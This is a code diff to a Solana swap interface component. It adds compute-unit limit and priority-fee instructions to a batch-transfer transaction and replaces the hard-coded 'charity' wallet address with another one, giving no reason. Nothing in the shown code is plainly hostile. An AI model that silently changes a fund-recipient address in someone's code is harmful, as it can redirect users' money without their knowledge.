@@ -5,12 +5,12 @@ import { Input } from '@/components/ui/input';
 import { TokenSearch } from './TokenSearch';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { ConnectWalletButton } from '@/components/ConnectWalletButton';
-import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 
-const CHARITY_WALLET = '9QnBS3LXmexHcSHsBxdGkXzkvFTnDrfk6yQgKMsUBMDX';
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
 const MAX_BATCH_SIZE = 5;
 
@@ -227,6 +227,21 @@ export const SwapInterface = ({
     if (!publicKey) return null;
 
     const transaction = new Transaction();
+    
+    // Add Compute Budget Instructions for better mobile reliability
+    // 1. Set higher compute unit limit for complex batch transfers
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitLimit({
+        units: 1_000_000,
+      })
+    );
+
+    // 2. Set priority fee to ensure inclusion during congestion
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitPrice({
+        microLamports: 100_000, // 0.0001 SOL priority fee
+      })
+    );
     
     // Add Memo Instruction
     transaction.add(
